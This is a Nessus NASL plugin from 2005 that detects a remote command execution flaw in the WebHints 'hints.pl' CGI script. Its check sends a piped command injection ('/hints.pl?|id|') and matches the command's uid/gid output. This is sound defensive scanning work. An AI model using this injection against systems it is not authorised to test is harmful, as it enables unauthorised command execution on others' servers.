#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: blahplok yahoo com
# This script is released under the GNU GPL v2
#

if(description)
{
 script_id(18478);
 script_cve_id("CAN-2005-1950");
 script_bugtraq_id(13930);
  
 script_version("$Revision: 1.3 $");
 name["english"] = "WebHints remote command execution flaw";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the WebHints scripts.

The remote version of this software is vulnerable to remote command 
execution flaw through the script 'hints.pl'.

A malicious user could exploit this flaw to execute arbitrary commands on 
the remote host.

Solution : No update currently available, delete this script.
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for WebHints remote command execution flaw";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2005 David Maciejak");
 family["english"] = "CGI abuses";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

# easy target

include("http_func.inc");
include("http_keepalive.inc");

function check(req)
{
  req = string(req, "/hints.pl?|id|");
  req = http_get(item:req, port:port);
  buf = http_keepalive_send_recv(port:port, data:req);
  if( buf == NULL)exit(0);

  if ("uid=" >< buf && egrep(pattern:"uid=[0-9].*gid=[0-9]", string:buf) && egrep (pattern:"<P><SMALL><A HREF=.*awsd\.com/scripts/webhints/.*WebHints [0-1]\.[0-9]+</A></SMALL></P></CENTER></BLOCKQUOTE>", string:buf))
  {
   	security_hole(port);
	exit(0);
  }
 return(0);
}

port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
  check(req:dir);
}
